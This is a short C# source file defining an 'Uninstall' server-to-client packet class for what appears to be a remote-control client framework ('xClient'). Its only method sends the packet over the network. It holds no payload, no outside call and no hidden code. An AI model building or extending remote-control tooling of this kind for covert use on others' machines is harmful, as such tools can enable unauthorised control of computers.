using ProtoBuf;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class Uninstall : IPacket
    {
        public Uninstall()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}